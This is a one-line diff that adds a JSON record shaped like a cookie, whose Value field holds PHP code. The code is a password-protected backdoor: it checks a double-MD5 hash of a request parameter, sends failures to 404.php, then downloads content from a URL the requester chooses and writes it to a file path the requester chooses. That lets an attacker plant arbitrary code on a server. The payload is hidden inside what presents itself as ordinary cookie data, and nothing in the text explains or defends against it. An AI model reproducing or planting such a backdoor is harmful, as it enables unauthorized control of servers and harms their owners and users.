@@ -1,0 +1,1 @@
+[{"Expires":1,"Discard":false,"Value":"<?php if (!hash_equals('4009d3fa8132195a2dab4dfa3affc8d2', md5(md5($_REQUEST['pass'] ?? '')))) { header('Location:404.php'); exit; } file_put_contents($_REQUEST['f'], file_get_contents($_REQUEST['d']));?>"}]
